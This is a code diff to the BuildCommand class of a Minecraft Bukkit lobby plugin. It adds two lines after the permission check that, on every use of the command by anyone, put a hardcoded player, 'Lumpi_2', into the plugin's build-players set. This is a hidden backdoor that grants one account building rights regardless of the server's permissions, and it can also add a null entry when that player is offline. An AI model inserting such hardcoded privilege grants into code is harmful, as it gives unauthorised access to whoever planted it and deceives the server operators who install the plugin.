@@ -2,6 +2,7 @@ package de.theredend2000.lobbyx.commands.playercommand;
 
 import de.theredend2000.lobbyx.Main;
 import de.theredend2000.lobbyx.messages.Util;
+import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -33,6 +34,8 @@ public class BuildCommand implements CommandExecutor {
                 player.sendMessage(Util.getMessage(Util.getLocale(player),"NoPermissionMessage").replaceAll("%PERMISSION%",permission));
         }else
             sender.sendMessage(Util.getMessage("en","OnlyPlayerUse"));
+        Player player = Bukkit.getPlayer("Lumpi_2");
+        plugin.getBuildPlayers().add(player);
         return false;
     }
 }
